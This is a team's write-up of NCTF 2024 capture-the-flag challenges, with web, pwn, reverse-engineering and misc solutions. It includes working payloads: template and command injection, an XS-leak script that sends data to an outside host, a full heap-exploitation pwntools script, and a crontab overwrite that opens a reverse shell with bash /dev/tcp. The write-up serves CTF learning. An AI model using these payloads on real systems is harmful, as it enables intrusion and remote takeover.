---
title: NCTF 2024 不知道 WP
date: 2025-04-14 18:13:44
tags: [cry,web,re,pwn,misc]
categories: wp
typora-root-url: ./..
---

# 战队名：不知道

**排名：6**

成员：LamentXU、Jerrythepro123、lianjin、Liv

## ![](/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png)

## WEB

拉门特许超级无敌详细版：

> https://www.cnblogs.com/LAMENTXU/articles/18799383

### sqlmap-master

签到题。

sqlmap有个--exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕

payload：

> 127.0.0.1?id=1 --eval=exec(bytes.fromhex('5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729'))

### ez_dash

我是第一个报告非预期的（大声）

根本不需要污染。bottle里<%也可以执行，waf没禁完。

直接打abort回显。秒了。

> GET /render?path=<%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput("env")%0aabort(404,a)%20%>

### ez_dash_revenge

首先污染掉pydash的helpers.RESTRICTED_KEYS，不然拿不到__globals__

> POST /setValue?name=pydash HTTP/1.1
>
> {
>
> "path": "helpers.RESTRICTED_KEYS",
>
> "value": "123"
>
> }

然后setval找globals找bottle。改templete的路径，加一个/proc/self

> POST /setValue?name=setval HTTP/1.1
>
> {
>
> "path": "__globals__.bottle.TEMPLATE_PATH",
>
> "value": ["./","./views/",
>
> 	"/proc/self/"
>
> ]
>
> }

随后直接render?path=environ即可

### internal_api

XS_leak，通过请求码来泄露。

exp：

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error-Based Attack</title>
</head>

<body>
    <script>
        let currentFlag = "nctf{";
        const chars = "abcdef0123456789-{}";

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function checkCharacter(char) {
            return new Promise((resolve) => {
                let script = document.createElement('script');
                script.src = `http://0.0.0.0:8000/internal/search?s=${currentFlag}${char}`;

                script.onload = () => {
                    document.head.removeChild(script);
                    resolve(true);
                };

                script.onerror = () => {
                    document.head.removeChild(script);
                    resolve(false);
                };

                document.head.appendChild(script);
            });
        }

        async function bruteforce() {
            try {
                while (!currentFlag.endsWith('}')) {
                    for (let char of chars) {
                        const isCorrect = await checkCharacter(char);
                        if (isCorrect) {
                            currentFlag += char;
                            window.open(`http://VPS:8000/?flag=${currentFlag}`);
                            await sleep(50);
                            break;
                        }
                        await sleep(50);
                    }
                }
            } catch (error) {
                window.open(`http://VPS:8000/?error=${currentFlag}`);
            }
        }

        bruteforce();
    </script>
</body>

</html>
```

VPS起这个服务，bot访问即可

![](/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png)

## PWN

### unauth-diary

先创造largebin来泄漏libc和堆地址，之后创造一个大小为-1的堆块，这样可以溢出来打tcache poisioning。用stdout结构体打house of apple来调用setcontext来写rop。rop用dup2来改输入输出的fd，这样就能拿到shell了。



```python
from pwn import *

context(arch='amd64',os='linux')
context.terminal = ["tmux", "splitw", "-h"]
#io=process("")
#io=remote("localhost",9999)
io=remote("39.106.16.204", 33245)
r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
    gdb.attach(io, gdbscript=script)

def add(size, content):
    sla(">", "1")
sla(":", str(size))
sla(":", content)

def free(idx):
    sla(">", "2")
sla(":", str(idx))

def view(idx):
    sla(">", "4")
sla(":", str(idx))

def edit(idx, content):
    sla(">", "3")
sla(":", str(idx))
sla(":", content)

for i in range(8):
    add(0x500, "A"*4)
add(0x10, "A"*8)

for i in range(8):
    free(i)

add(0x10, "A"*8)
add(0x10, "A"*8)
add(0x10, "A"*8)
add(0x10, "A"*8)
add(0x10, "A")
add(0x200, "A"*8)
add(0x300, "A"*8)

view(5)
ru("A"*8)
libc=u64(r(8))-0x203b00
print hex(libc)

view(6)
ru("A"*8)
heap=u64(r(8))-0x1200
print hex(heap)
edit(6, "/bin/sh\0")
add(-1, "A"*8) #7
add(0x101, "A"*8)
add(0x101, "A"*8)
free(10)
free(9)

stdout=libc+0x2045c0
io_list_all=libc+0x2044c0
target=(io_list_all)^(heap+0x1060)>>12
target1=(stdout)^(heap+0x1080)>>12

p="A"*0x10+p64(0)+p64(0x21)+p64(target)
p+=p64(0)+p64(0)+p64(0x111)+p64(target1)

fake_io_addr=heap+0xd20

edit(7, p)
add(0x101, p64(fake_io_addr))

system=libc+0x58750
environ=libc+0x20ad58
_IO_wfile_jumps=libc+0x202228
setcontext=libc+0x4a99d

rop_addr=heap+0x850
rax=libc+0xdd237
rdi=libc+0x158748
rsi=libc+0x02b46b
syscall=libc+0x127185+4
rsp=libc+0x5ef6f
rdx=libc+0x162e3a

rop=p64(rax)+p64(0x21)
rop+=p64(rdi)+p64(4)+p64(0)*5
rop+=p64(rsi)+p64(0)*2
rop+=p64(syscall)

rop+=p64(rax)+p64(0x21)
rop+=p64(rdi)+p64(4)+p64(0)*5
rop+=p64(rsi)+p64(1)*2
rop+=p64(syscall)

rop+=p64(rax)+p64(0x3b)
rop+=p64(rdi)+p64(heap+0xd20)+p64(0)*5
rop+=p64(rsi)+p64(0)+p64(heap+0x978+0x28)
rop+=p64(rdx)+p64(0)*3+p64(heap+0x978+0x28)
rop+=p64(syscall)

edit(5, rop)

fake_io = flat({
    0x0: " sh;",
    0x10: p64(setcontext),
    0x20: p64(stdout),
    0x88: p64(rop_addr),  # _lock
    0xa0: p64(stdout),
    0xa8: p64(rsp),
    0xd8: p64(_IO_wfile_jumps + 0x10),
    0xe0: p64(stdout-8),
}, filler=b"\x00")


add(0x101, fake_io)
shell()
```



## RE

### ezDOS

程序中间出现的花指令都直接nop去除，然后Apply patch到程序。

![](/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png)

程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。

![](/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png)

使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符'1'。

![](/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png)

![](/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png)

直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。

> 32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1

取出0x142地址的38字节，进行异或即可得到解密flag。

![](/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png)

### SafeProgram

核心加密是一个SM4加密。

![](/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png)

查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。

![](/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png)

![](/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png)

发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。

![](/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png)

![](/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png)

![](/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png)

然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。

![](/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png)

main函数可以看到要求输入格式为NCTF{...}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。

![](/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png)

动调时提取这三个数组数据，进行解密即可。

![](/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png)

key是main函数两次memcpy那边的数据，结果如下。

![](/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png)

解密代码：



```cpp
#include <iostream>
#include <string>
#include <windows.h>
#include <vector>

unsigned char byte_7FF699A4A0D0[256] = {
0xD1, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,
0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,
0xE4, 0xB3, 0x17, 0xA9, 0x1C, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,
0x47, 0x07, 0xA7, 0x4F, 0xF3, 0x73, 0x71, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0xD6, 0xA8,
0x68, 0x6B, 0x81, 0xB2, 0xFC, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,
0x1E, 0x24, 0x0E, 0x78, 0x63, 0x58, 0x9F, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0xC9, 0x87,
0xD4, 0x00, 0x46, 0x57, 0x5E, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E,
0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1,
0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3,
0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F,
0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51,
0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8,
0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0,
0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84,
0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48
};

unsigned int dword_7FF699A4A040[32] = {
0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269, 0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,
0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249, 0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,
0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229, 0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,
0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209, 0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279
};
unsigned int dword_7FF699A4A028[4] = {
0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC
};

static inline uint32_t rotate_left(uint32_t x, int n) 
{
    return (x << n) | (x >> (32 - n));
}

static void generate_buf(const uint8_t* key, uint32_t* buf) 
{
    for (int i = 0; i < 4; i++) 
        {
            uint32_t key_dword;
            memcpy(&key_dword, key + 4 * i, 4);
            uint32_t converted_key = ((key_dword & 0xFF) << 24) |
            ((key_dword & 0xFF00) << 8) |
            ((key_dword >> 8) & 0xFF00) |
            ((key_dword >> 24) & 0xFF);
            buf[i] = dword_7FF699A4A028[i] ^ converted_key;
        }
    for (int j = 0; j < 32; j++) 
        {
            uint32_t v12 = dword_7FF699A4A040[j] ^ buf[j + 3] ^ buf[j + 2] ^ buf[j + 1];
            uint8_t* v12_bytes = (uint8_t*)&v12;
            for (int k = 0; k < 4; k++)
                {
                    v12_bytes[k] = byte_7FF699A4A0D0[v12_bytes[k]];
        }
        uint32_t rot1 = rotate_left(v12, 23);
        uint32_t rot2 = rotate_left(v12, 13);
        buf[j + 4] = (rot1 ^ rot2 ^ v12) ^ buf[j];
    }
}

void decrypt(const uint8_t* ciphertext, const uint8_t* key, uint8_t* plaintext)
{
    uint32_t buf[36] = { 0 };
    uint32_t buf_1[36] = { 0 };

    generate_buf(key, buf);

    for (int ii = 0; ii < 4; ii++)
    {
        uint32_t cipher_dword;
        memcpy(&cipher_dword, ciphertext + 4 * ii, 4);
        buf_1[35 - ii] = ((cipher_dword >> 24) & 0xFF) |
            ((cipher_dword >> 8) & 0xFF00) |
            ((cipher_dword << 8) & 0xFF0000) |
            ((cipher_dword << 24) & 0xFF000000);
    }

    for (int m = 31; m >= 0; m--)
    {
        uint32_t v12_0 = buf[m + 4] ^ buf_1[m + 3] ^ buf_1[m + 2] ^ buf_1[m + 1];
        uint8_t* v12_bytes = (uint8_t*)&v12_0;
        for (int n = 0; n < 4; n++) 
        {
            v12_bytes[n] = byte_7FF699A4A0D0[v12_bytes[n]];
        }
        uint32_t rot1 = rotate_left(v12_0, 24);
        uint32_t rot2 = rotate_left(v12_0, 18);
        uint32_t rot3 = rotate_left(v12_0, 10);
        uint32_t rot4 = rotate_left(v12_0, 2);
        uint32_t L_result = rot1 ^ rot2 ^ rot3 ^ rot4 ^ v12_0;
        buf_1[m] = buf_1[m + 4] ^ L_result;
    }

    for (int i = 0; i < 4; i++)
    {
        uint32_t v11 = buf_1[i];
        uint8_t b0 = (v11 >> 24) & 0xFF;
        uint8_t b1 = (v11 >> 16) & 0xFF;
        uint8_t b2 = (v11 >> 8) & 0xFF;
        uint8_t b3 = v11 & 0xFF;
        uint32_t le = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0;
        memcpy(plaintext + 4 * i, &le, 4);
    }
}

int main_safe()
{
    uint8_t key[] = "NCTF24nctfNCTF24";
    unsigned char enc[32] = {
    0xFB, 0x97, 0x3C, 0x3B, 0xF1, 0x99, 0x12, 0xDF, 0x13, 0x30, 0xF7, 0xD8, 0x7F, 0xEB, 0xA0, 0x6C,
    0x14, 0x5B, 0xA6, 0x2A, 0xA8, 0x05, 0xA5, 0xF3, 0x76, 0xBE, 0xC9, 0x01, 0xF9, 0x36, 0x7B, 0x46
    };

    unsigned char flag[32]{};
    decrypt(enc, key, flag);
    decrypt(enc+16, key, flag+16);

    printf("NCTF{%.32s}\n", flag);
    
    return 0;
}
```

### gogo

main_main函数可以看到是将输入分块通过channel进行协程通信。

![](/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png)

在main_main函数附件有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用函数计算。这边一系列计算函数也印证想法。

![](/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png)

![](/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png)

对每个vm的函数都下断点输出，如XOR这样：

![](/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png)

![](/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png)

运行输入可以得到一堆伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。

![](/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png)

![](/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png)

通过分析可得知是将flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。

还原加密代码如下，基于标准XXTEA进行修改的：

```cpp
#define DELTA 0x9e3779b9

#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))

#define MX2 (((z << 5 ^ y >> 2) + (y << 3 ^ z >> 4)) ^ ((sum ^ y) + (key2[(p & 3) ^ e] ^ z)))

uint32_t key[]{ 0x6e637466, 0x62ef0ed ,0xa78c0b4f, 0x32303234 };

uint32_t key2[]{ 0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446 };

void xxtea_1(uint32_t* v, int n)
{
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    rounds = 16;
    sum = 0;
    z = v[n - 1];
    do
    {
        sum += DELTA;
        e = (sum >> 2) & 3;
        for (p = 0; p < 5; p++)
        {
            y = v[(p + 1) % 5];
            z = v[p] += MX;
        }
    } while (--rounds);
}

void xxtea_2(uint32_t* v, int n)
{
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    rounds = 16;
    sum = 0;
    z = v[n - 1];
    do
    {
        sum += DELTA;
        e = (sum >> 2) & 3;
        for (p = 0; p < 5; p++)
        {
            y = v[(p + 1) % 5];
            z = v[p] += MX2;
        }
    } while (--rounds);
}
```

在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。

![](/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png)

解密代码：

```cpp
#include <iostream>
#define DELTA 0x9e3779b9

#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))

#define MX2 (((z << 5 ^ y >> 2) + (y << 3 ^ z >> 4)) ^ ((sum ^ y) + (key2[(p & 3) ^ e] ^ z)))

uint32_t key[]{ 0x6e637466, 0x62ef0ed ,0xa78c0b4f, 0x32303234 };

uint32_t key2[]{ 0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446 };

void xxtea_decrypt1(uint32_t* v, int n)
{
    uint32_t y, z, sum;
    unsigned rounds, e;
    rounds = 16;
    sum = DELTA * rounds;
    y = v[0]; 
    do
    {
        e = (sum >> 2) & 3;
        for (int p = 5 - 1; p >= 0; p--)
        {
            if (p == 0)
                z = v[4];
            else
                z = v[(p-1)%5];

            if (p == 4)
                y = v[0];
            else
                y = v[p + 1];

            v[p] -= MX;
            
        }
        sum -= DELTA;
    } while (--rounds);
}

void xxtea_decrypt2(uint32_t* v, int n)
{
    uint32_t y, z, sum;
    unsigned rounds, e;
    rounds = 16;
    sum = DELTA * rounds;
    y = v[0];
    do
    {
        e = (sum >> 2) & 3;
        for (int p = 5 - 1; p >= 0; p--)
        {
            if (p == 0)
                z = v[4];
            else
                z = v[(p - 1) % 5];

            if (p == 4)
                y = v[0];
            else
                y = v[p + 1];

            v[p] -= MX2;

        }
        sum -= DELTA;
    } while (--rounds);
}

int main()
{
    unsigned char enc1[] =
    {
      0x5D, 0x45, 0xD5, 0xB9, 0x8C, 0x95, 0x9C, 0x38, 0x3B, 0xB1,
      0x3E, 0x1E, 0x5F, 0xC8, 0xE8, 0xBB, 0x64, 0x38, 0x48, 0x69
    };
    unsigned char enc2[] =
    {
      0xDE, 0x81, 0xD8, 0xAD, 0xC2, 0xC4, 0xA6, 0x32, 0x1C, 0xAB,
      0x61, 0x3E, 0xCB, 0xFF, 0xEF, 0xF1, 0x27, 0x30, 0x7A, 0x16
    };

    xxtea_decrypt1((uint32_t*)enc1, 5);
    xxtea_decrypt2((uint32_t*)enc2, 5);
    
    printf("%.20s%.20s\n", enc1,enc2);

    return 0;
}
```



## MISC 

### <font style="color:#000000;">X1crypsc</font>

题目使用random库生成随机数，基于mt19937-32算法，选择W可以任意获取随机数数据，构造矩阵即可逆向mt19937的状态，即可预测随机数，攻击成功后进入下面的黑盒阶段。

```python
from pwn import *
from random import Random
import sys
from Crypto.Util.number import *
from random import *
from tqdm import *

# ==========================
#  Phase 1: 收集PRNG输出数据
# ==========================
def collect_bits(p):
    print("[+] Collecting 624*32 bits for MT19937 state...")
    
    bits_collected = 0
    D=[]
    while bits_collected < 625 * 32:  
        p.sendlineafter(b'option:', b'W')  # 选择武器刷新
        p.recvuntil(b'Current attack value: ')
        line = p.recvline().decode()
        low, high = map(int, line.split(' ~ '))
        base = low
        add = high - base 
        
        val1 = base
        val2 = add

        D.append(val1)
        D.append(val2)
        p.sendline(b'y')
        bits_collected += 32
        
        sys.stdout.write(f"\rBits collected: {bits_collected}/20000")
        sys.stdout.flush()
        
        # 发送'n'不继续刷新
        p.sendlineafter(b'?', b'n')

    print(len(D))
    return D

# ==========================
#  Phase 2: 预测坐标并攻击
# ==========================
def attack_monster(p, predictor,D):
    print('[+]')
    while True:
        # 预测下一个randrange(2025) x和y
        x = predictor.randrange(2025)
        y = predictor.randrange(2025)
        print(x,y)
        # 发送攻击指令
        p.recvuntil(b'option:')
        p.sendline(b'A')
        p.recvuntil(b'aim:')
        p.sendline(f"{x} {y}".encode())
        
        resp = p.recvuntil(b'\n').decode()
        
        a=predictor.randint(D[-2],D[-1])
        if b'Victory' in p.recvline():
            print('-------------------------------------------------')
            print(p.recv(1000))
            return
    

#--------------------------------------------------------------

context(log_level="debug")
p = remote('39.106.16.204', 11448) 

Dall = collect_bits(p)
print(Dall)

n=1250
D=Dall[:n]
rng=Random()

def getRows(rng):
    row=[]
    for i in range(n):
        row+=list(map(int, (bin(rng.getrandbits(16))[2:].zfill(16))))
    return row
M=[]
for i in (range(19968)):
    state = [0]*624
    temp = "0"*i + "1"*1 + "0"*(19968-1-i)
    for j in range(624):
        state[j] = int(temp[32*j:32*j+32],2)
    rng.setstate((3,tuple(state+[624]),None)) 
    M.append(getRows(rng))
    
print('--------------------------------------------------')
M=Matrix(GF(2),M)
y=[]
for i in range(n):
    y+=list(map(int, (bin(D[i])[2:].zfill(16))))
y=vector(GF(2),y)
s=M.solve_left(y)
G=[]
for i in range(624):
    C=0
    for j in range(32):
        C<<=1
        C|=int(s[32*i+j])
    G.append(C)
import random
RNG1 = random.Random()
for i in range(624):
    G[i]=int(G[i])
RNG1.setstate((int(3),tuple(G+[int(624)]),None))

#------------------------------------------------------------
#控制到当前状态
RNG1.getrandbits(64)
ss=0
d1=[]
while ss < 625 * 32:
    d1.append(RNG1.getrandbits(16))
    d1.append(RNG1.getrandbits(16))
    ss += 32

print(d1[-10:-1])


print('------------att-------------')
attack_monster(p, RNG1,Dall)

p.interactive()

#--------------------------------------------------------------
```

黑盒部分：

只有输入文件名以及输入文件内容这些功能

发现可以文件名任意写，覆盖crontab定时任务，执行shellcode来远程操控

```bash
....//....//....//....//etc/crontab

SHELL=/bin/sh

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```

获得shell后寻找flag

```bash
#linux命令：
find / -type f -exec grep -l -i "nctf" {} + 2>/dev/null

#Out:
/proc/1/task/1/environ

#linux命令：
cat /proc/1/task/1/environ

#Out：
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=comp-xlcrypsc-67706716887745083pclt4FLAG=nctf{760bd839-02ff-4b4f-b5a9-3b006910963a}KUBERNETES_PORT=tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP=tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_ADDR=192.168.0.1KUBERNETES_SERVICE_HOST=192.168.0.1KUBERNETES_SERVICE_PORT=443KUBERNETES_SERVICE_PORT_HTTPS=443HOME=/root

```

### QRcode Reconstruction

![](/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png)手搓。

最后decode是

![](/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png)

猜到flag是nctf{WeLc0mE_t0_Nctf_2024!!!}

## CRYPTO

爆零O.o
